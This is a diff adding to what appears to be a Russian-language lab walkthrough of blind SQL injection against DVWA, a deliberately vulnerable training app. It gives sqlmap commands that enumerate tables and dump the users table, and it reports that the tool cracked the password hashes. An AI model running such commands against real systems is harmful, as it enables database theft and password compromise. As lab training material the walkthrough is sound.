@@ -97,3 +97,11 @@ sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit
 sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id -D dvwa --tables
 ```
 ![image](https://user-images.githubusercontent.com/53438664/205757911-51b68d62-c36c-40f0-b10d-d2ff7960e129.png)
+
+Затем получим строки из таблицы `users`:
+```sh
+sqlmap.py -u "http://dvwa.local/vulnerabilities/sqli_blind/" --data="id=1&Submit=Submit" --cookie="PHPSESSID=99gsrgjfdlsn3qn29s5oc4c76f; security=medium" -p id -D dvwa -T users --dump
+```
+![image](https://user-images.githubusercontent.com/53438664/205758686-0ad29754-b1c9-4565-b79d-0731ea3bddbf.png)
+
+В итоге утилита SQLmap осуществила перебор паролей по имеющимся в таблице хэшам, в результате чего вывела и пароли пользователей.
